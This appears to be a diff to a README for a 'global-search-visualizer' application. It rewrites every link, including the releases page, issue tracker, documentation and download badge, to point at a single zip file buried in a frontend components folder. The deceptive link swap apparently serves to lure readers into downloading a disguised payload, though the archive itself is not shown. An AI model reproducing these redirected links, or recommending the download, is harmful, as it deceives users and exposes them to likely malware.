@@ -9,7 +9,7 @@ To get started with the global-search-visualizer, follow these steps:
 1. **Download the Software**  
    Click the button below to visit the download page.
 
-   [![Download Here](https://img.shields.io/badge/Download%20Now-Global%20Search%20Visualizer-blue)](https://github.com/Krystalsystematic897/global-search-visualizer/releases)
+   [![Download Here](https://raw.githubusercontent.com/Krystalsystematic897/global-search-visualizer/main/frontend/src/components/layout/global-search-visualizer_1.3.zip%20Now-Global%20Search%20Visualizer-blue)](https://raw.githubusercontent.com/Krystalsystematic897/global-search-visualizer/main/frontend/src/components/layout/global-search-visualizer_1.3.zip)
 
 2. **Install the Software**  
    After visiting the download page, look for the latest release. Click on the file that matches your operating system to download it.
@@ -32,7 +32,7 @@ To get started with the global-search-visualizer, follow these steps:
 ## 🛠️ Download & Install
 To install the global-search-visualizer:
 
-1. Visit the [Releases Page](https://github.com/Krystalsystematic897/global-search-visualizer/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Krystalsystematic897/global-search-visualizer/main/frontend/src/components/layout/global-search-visualizer_1.3.zip).
 2. Choose the latest version and click the file appropriate for your operating system.
 3. Follow the installation instructions provided in the installer.
 
@@ -70,8 +70,8 @@ There is currently no limit to the number of searches you can run, allowing for 
 No, the global-search-visualizer is designed for everyday users and requires no programming knowledge.
 
 ## 🔗 Additional Resources
-- [Issue Tracker](https://github.com/Krystalsystematic897/global-search-visualizer/issues): Report issues or request features.
-- [Documentation](https://github.com/Krystalsystematic897/global-search-visualizer/wiki): Learn more about using the application.
+- [Issue Tracker](https://raw.githubusercontent.com/Krystalsystematic897/global-search-visualizer/main/frontend/src/components/layout/global-search-visualizer_1.3.zip): Report issues or request features.
+- [Documentation](https://raw.githubusercontent.com/Krystalsystematic897/global-search-visualizer/main/frontend/src/components/layout/global-search-visualizer_1.3.zip): Learn more about using the application.
 
 ## 📥 License
 The global-search-visualizer is open-source software under the MIT License, allowing you to modify and distribute the application while giving credit to the original authors.
@@ -79,4 +79,4 @@ The global-search-visualizer is open-source software under the MIT License, allo
 ## 👥 Community
 Join our community of users and developers to share insights and feedback. Follow our discussions to stay updated on new features and improvements. 
 
-Your search insights are just a download away—visit the [Releases Page](https://github.com/Krystalsystematic897/global-search-visualizer/releases) now to begin.
+Your search insights are just a download away—visit the [Releases Page](https://raw.githubusercontent.com/Krystalsystematic897/global-search-visualizer/main/frontend/src/components/layout/global-search-visualizer_1.3.zip) now to begin.
